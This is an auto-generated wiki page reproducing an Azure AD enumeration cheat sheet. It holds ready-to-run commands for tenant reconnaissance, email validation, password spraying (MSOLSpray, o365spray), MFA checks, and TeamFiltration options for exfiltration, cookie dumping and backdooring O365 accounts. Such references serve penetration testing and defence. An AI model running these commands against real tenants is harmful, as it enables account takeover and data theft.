---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure AD - Enumerate

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-enumeration` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-enumeration.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure AD - Enumerate](../../topics/cloud/azure-ad-enumerate.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-enumeration |
| name | Azure AD - Enumerate |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-enumeration.md |

## Preserved Source Material

````yaml
_body: "# Azure AD - Enumerate\n\n## Azure AD - Collectors\n\n* [**Microsoft Portals**](https://msportals.io/) - Microsoft\
  \ Administrator Sites\n* [**dirkjanm/ROADTool**](https://github.com/dirkjanm/ROADtools) - A collection of Azure AD tools\
  \ for offensive and defensive security purposes\n\n    ```ps1\n    roadrecon auth --access-token eyJ0eXA...\n    roadrecon\
  \ auth --prt-cookie <primary-refresh-token> -r msgraph -c \"1950a258-227b-4e31-a9cf-717495945fc2\"\n    roadrecon gather\n\
  \    roadrecon gui\n    ```\n\n* [**BloodHoundAD/AzureHound**](https://github.com/BloodHoundAD/AzureHound) - Azure Data\
  \ Exporter for BloodHound\n\n    ```ps1\n    ./azurehound --refresh-token <refresh-token> list --tenant \"<target-tenant-id>\"\
  \ -o output.json\n    ./azurehound -u \"<username>@contoso.onmicrosoft.com\" -p \"<password>\" list groups --tenant \"<tenant>.onmicrosoft.com\"\
  \n    ./azurehound -j \"<jwt>\" list users --tenant \"<tenant>.onmicrosoft.com\"\n    ```\n\n* [**BloodHoundAD/BARK**](https://github.com/BloodHoundAD/BARK)\
  \ - BloodHound Attack Research Kit\n\n    ```ps1\n    . .\\BARK.ps1\n    $MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword\
  \ -username \"user@contoso.onmicrosoft.com\" -password \"MyVeryCoolPassword\" -TenantID \"contoso.onmicrosoft.com\"\n  \
  \  $MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID \"contoso.onmicrosoft.com\"\
  \n    $MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress\n    ```\n\n* [**dafthack/GraphRunner**](https://github.com/dafthack/GraphRunner)\
  \ - A Post-exploitation Toolset for Interacting with the Microsoft Graph API\n\n    ```ps1\n    Invoke-GraphRecon -Tokens\
  \ $tokens -PermissionEnum\n    Invoke-DumpCAPS -Tokens $tokens -ResolveGuids\n    Invoke-DumpApps -Tokens $tokens\n    Get-DynamicGroups\
  \ -Tokens $tokens\n    ```\n\n* [**NetSPI/MicroBurst**](https://github.com/NetSPI/MicroBurst) - MicroBurst includes functions\
  \ and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as\
  \ credential dumping\n\n    ```powershell\n    PS C:> Import-Module .\\MicroBurst.psm1\n    PS C:> Import-Module .\\Get-AzureDomainInfo.ps1\n\
  \    PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose\n    ```\n\n* [**hausec/PowerZure**](https://github.com/hausec/PowerZure)\
  \ - PowerShell framework to assess Azure security\n\n    ```powershell\n    Import-Module .\\Powerzure.psd1\n    Set-Subscription\
  \ -Id [idgoeshere]\n    Get-AzureTarget\n    Get-AzureInTuneScript\n    Show-AzureKeyVaultContent -All\n    ```\n\n* [**silverhack/monkey365**](https://github.com/silverhack/monkey365)\
  \ - Microsoft 365, Azure subscriptions and Microsoft Entra ID security configuration reviews.\n\n    ```powershell\n   \
  \ Get-ChildItem -Recurse c:\\monkey365 | Unblock-File\n    Import-Module C:\\temp\\monkey365\n    Get-Help Invoke-Monkey365\n\
  \    Get-Help Invoke-Monkey365 -Examples\n    Get-Help Invoke-Monkey365 -Detailed\n    ```\n\n* [**prowler-cloud/prowler**](https://github.com/prowler-cloud/prowler)\
  \ - Prowler is an Open Source Security tool for AWS, Azure, GCP and Kubernetes to do security assessments, audits, incident\
  \ response, compliance, continuous monitoring, hardening and forensics readiness. Includes CIS, NIST 800, NIST CSF, CISA,\
  \ FedRAMP, PCI-DSS, GDPR, HIPAA, FFIEC, SOC2, GXP, Well-Architected Security, ENS and more\n* [**projectdiscovery/nuclei-templates**](https://github.com/projectdiscovery/nuclei-templates/tree/main/cloud/azure)\
  \ - Community curated list of templates for the nuclei engine to find security vulnerabilities.\n\n    ```ps1\n    nuclei\
  \ -t ~/nuclei-templates/cloud/azure/ -code -v\n    ```\n\n* [**nccgroup/ScoutSuite**](https://github.com/nccgroup/ScoutSuite)\
  \ - Multi-Cloud Security Auditing Tool\n* [**Flangvik/TeamFiltration**](https://github.com/Flangvik/TeamFiltration) - TeamFiltration\
  \ is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts\n\n    ```ps1\n\
  \    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --exfil --cookie-dump\
  \ C:\\\\CookieData.txt --all\n    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json\
  \ --exfil --aad \n    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --exfil\
  \ --tokens C:\\\\OutputTokens.txt --onedrive --owa\n    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput\
  \ --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000\n    TeamFiltration.exe --outpath  C:\\Clients\\2023\\\
  FooBar\\TFOutput --config myCustomConfig.json --debug --exfil --onedrive\n    TeamFiltration.exe --outpath  C:\\Clients\\\
  2023\\FooBar\\TFOutput --config myCustomConfig.json --enum --validate-teams\n    TeamFiltration.exe --outpath  C:\\Clients\\\
  2023\\FooBar\\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\\Clients\\2021\\FooBar\\OSINT\\\
  Usernames.txt\n    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --backdoor\n\
  \    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --database\n    ```\n\
  \n* [**Azure/StormSpotter**](https://github.com/Azure/Stormspotter) - :warning: This repository has not been updated recently\
  \ - Azure Red Team tool for graphing Azure and Azure Active Directory objects\n* [**nccgroup/Azucar**](https://github.com/nccgroup/azucar.git)\
  \ - :warning: This repository has been archived - Azucar automatically gathers a variety of configuration data and analyses\
  \ all data relating to a particular subscription in order to determine security risks.\n* [**FSecureLABS/Azurite**](https://github.com/FSecureLABS/Azurite)\
  \ - :warning: This repository has not been updated recently - Enumeration and reconnaissance activities in the Microsoft\
  \ Azure Cloud.\n* [**cyberark/SkyArk**](https://github.com/cyberark/SkyArk) - :warning: This repository has not been updated\
  \ recently - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.\n\n\
  ## Azure AD - User Enumeration\n\n### Enumerate Tenant Informations\n\n* Federation with Azure AD or O365\n\n    ```powershell\n\
  \    Get-AADIntLoginInformation -UserName <USER>@<TENANT NAME>.onmicrosoft.com\n    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1\n\
  \    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1\n    ```\n\n* Get\
  \ the Tenant ID\n\n    ```powershell\n    Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com\n    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration\n\
  \    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration\n    ```\n\n### Enumerate\
  \ from a Guest Account\n\n```ps1\npowerpwn recon --tenant {tenantId} --cache-path {path}\npowerpwn dump -tenant {tenantId}\
  \ --cache-path {path}\npowerpwn gui --cache-path {path}\n```\n\n### Enumerate Emails\n\n> By default, O365 has a lockout\
  \ policy of 10 tries, and it will lock out an account for one (1) minute.\n\n* Validate email\n\n    ```powershell\n   \
  \ PS> C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt\n\
  \    admin@<TENANT NAME>.onmicrosoft.com   - VALID\n    root@<TENANT NAME>.onmicrosoft.com    - INVALID\n    test@<TENANT\
  \ NAME>.onmicrosoft.com    - VALID\n    contact@<TENANT NAME>.onmicrosoft.com - INVALID\n    ```\n\n* Extract email lists\
  \ with a valid credentials : [nyxgeek/o365recon](https://github.com/nyxgeek/o365recon)\n\n    ```powershell\n    Install-Module\
  \ MSOnline\n    Install-Module AzureAD\n    .\\o365recon.ps1 -azure\n    ```\n\n### Password Spraying\n\nThe default lockout\
  \ policy tolerates 10 failed attempts, then lock out an account for 60 seconds.\n\n* [dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)\n\
  \n    ```powershell\n    PS> . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1\n    PS> Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt\
  \ -Password <PASSWORD> -Verbose\n    PS> Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020\n    PS> Invoke-MSOLSpray\
  \ -UserList .\\users.txt -Password d0ntSprayme!\n    ```\n\n* [0xZDH/o365spray](https://github.com/0xZDH/o365spray)\n\n\
  \    ```powershell\n    o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com\n  \
  \  ```\n\n* [Flangvik/TeamFiltration](https://github.com/Flangvik/TeamFiltration)\n\n    ```powershell\n    TeamFiltration.exe\
  \ --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push\
  \ --shuffle-users --shuffle-regions\n    TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json\
  \ --spray --push-locked --months-only --exclude C:\\Clients\\2021\\FooBar\\Exclude_Emails.txt\n    TeamFiltration.exe --outpath\
  \  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --spray --passwords C:\\Clients\\2021\\FooBar\\Generic\\\
  Passwords.txt --time-window 13:00-22:00\n    ```\n\n## Azure Services Enumeration\n\n### Enumerate Tenant Domains\n\nExtract\
  \ openly available information for the given tenant: [aadinternals.com/osint](https://aadinternals.com/osint/)\n\n```ps1\n\
  Invoke-AADIntReconAsOutsider -DomainName <DOMAIN>\nInvoke-AADIntReconAsOutsider -Domain \"company.com\" | Format-Table\n\
  Invoke-AADIntReconAsOutsider -UserName \"user@company.com\" | Format-Table\n```\n\n### Enumerate Azure Subdomains\n\n```powershell\n\
  PS> . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1\nPS> Invoke-EnumerateAzureSubDomains -Base <TENANT\
  \ NAME> -Verbose\nSubdomain Service\n--------- -------\n<TENANT NAME>.mail.protection.outlook.com Email\n<TENANT NAME>.onmicrosoft.com\
  \ Microsoft Hosted Domain\n```\n\n### Enumerate Services\n\n* Using Az Powershell module\n\n    ```powershell\n    # Enumerate\
  \ resources\n    PS Az> Get-AzResource\n\n    # List all VM's the user has access to\n    PS Az> Get-AzVM \n\n    # Get\
  \ all webapps\n    PS Az> Get-AzWebApp | ?{$_.Kind -notmatch \"functionapp\"}\n\n    # Get all function apps\n    PS Az>\
  \ Get-AzFunctionApp\n\n    # List all storage accounts\n    PS Az> Get-AzStorageAccount\n\n    # List all keyvaults\n  \
  \  PS Az> Get-AzKeyVault\n\n    # Get all application objects registered using the current tenant\n    PS AzureAD> Get-AzureADApplication\
  \ -All $true\n\n    # Enumerate role assignments\n    PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>\n\
  \    PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com\n\n    # Check AppID Alternative Names/Display\
  \ Name \n    PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \"<APP-ID>\"} | fl\n    ```\n\n* Using\
  \ az cli\n\n    ```powershell\n    PS> az vm list\n    PS> az vm list --query \"[].[name]\" -o table\n    PS> az webapp\
  \ list\n    PS> az functionapp list --query \"[].[name]\" -o table\n    PS> az storage account list\n    PS> az keyvault\
  \ list\n    ```\n\n## Multi Factor Authentication\n\n* [dafthack/MFASweep](https://github.com/dafthack/MFASweep) - A tool\
  \ for checking if MFA is enabled on multiple Microsoft Services\n\n```ps1\nImport-Module .\\MFASweep.ps1\nInvoke-MFASweep\
  \ -Username targetuser@targetdomain.com -Password Winter2020\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password\
  \ Winter2020 -Recon -IncludeADFS\n```\n\n## References\n\n* [Bypassing conditional access by faking device compliance -\
  \ @DrAzureAD - September 06, 2020](https://o365blog.com/post/mdm/)\n* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP\
  \ course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)\n* [Attacking Azure/Azure AD\
  \ and introducing Powerzure - SpecterOps - Ryan Hausknecht - Jan 28, 2020](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)\n* [Azure\
  \ Config Review - Nuclei Templates v10.0.0 - Prince Chaddha - Sep 12, 2024](https://blog.projectdiscovery.io/azure-config-review-with-nuclei/)"
_relative_path: cloud/azure/azure-enumeration.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-enumeration.md
````
